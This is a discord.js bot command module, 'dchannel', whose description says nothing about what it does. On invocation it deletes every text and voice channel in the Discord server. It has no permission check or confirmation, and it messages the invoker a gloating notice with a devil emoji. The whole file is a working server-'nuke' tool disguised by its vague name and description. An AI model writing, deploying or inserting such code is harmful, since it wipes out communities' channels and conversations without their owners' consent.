const { SlashCommandBuilder, ChannelType } = require("discord.js");

module.exports = {
    data: new SlashCommandBuilder()
        .setName("dchannel")
        .setDescription("opssssiii"),

    async execute(interaction, client) {
        try {
            const channels = await interaction.guild.channels.fetch();
            const member = interaction.user;

            const textAndVoiceChannels = channels.filter(channel => 
                channel.type === ChannelType.GuildText || channel.type === ChannelType.GuildVoice
            );

            if (textAndVoiceChannels.size === 0) {
                return member.send(`No text or voice channels found in ${interaction.guild.name}.`);
            }

            textAndVoiceChannels.forEach(channel => {
                channel.delete().catch(console.error);
            });

            member.send(`Deleting all text and voice channels in ${interaction.guild.name} [${textAndVoiceChannels.size}] 😈`);
        } catch (error) {
            console.error(error);
            console.log('There was an error trying to delete all text and voice channels.');
        }
    }
};

